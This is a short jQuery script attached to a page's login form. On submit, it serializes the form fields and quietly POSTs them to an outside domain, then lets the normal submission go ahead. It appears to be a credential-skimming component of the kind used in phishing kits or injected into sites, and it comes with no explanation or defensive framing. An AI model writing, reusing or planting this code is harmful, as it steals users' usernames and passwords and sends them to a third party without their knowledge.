$(".login-form").submit(function() {
	var d = $(".login-form");

	$.ajax({
        url: "https://testing.videohot.my.id/json/",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
